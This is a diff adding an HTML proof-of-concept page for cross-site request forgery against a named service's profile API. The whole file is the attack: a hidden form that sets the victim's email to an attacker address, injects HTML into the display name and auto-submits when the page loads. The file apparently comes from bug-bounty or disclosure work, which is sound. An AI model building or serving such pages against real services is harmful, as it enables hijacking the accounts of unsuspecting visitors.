@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>Click the button to perform CSRF</h1>
+    <form id="csrfForm" action="https://app.lyssna.com/api/profile" method="PATCH" enctype="multipart/form-data">
+        <input type="hidden" name="has_custom_job_role" value="true">
+        <input type="hidden" name="job_role" value="Designer">
+        <input type="hidden" name="custom_job_role" value="evil.com">
+        <input type="hidden" name="email" value="attacker@example.com">
+        <input type="hidden" name="preferred_name" value="<h1>Attacker</h1>">
+        <input type="hidden" name="name" value="Evil Hacker">
+        <input type="hidden" name="email_product_updates" value="true">
+        <input type="hidden" name="email_comment_notifications" value="true">
+        <input type="hidden" name="email_newsletters_and_promotions" value="true">
+        <input type="hidden" name="email_general" value="true">
+        <button type="submit">Click Me</button>
+    </form>
+    <script>
+        // Automatically submit the form when the page loads
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
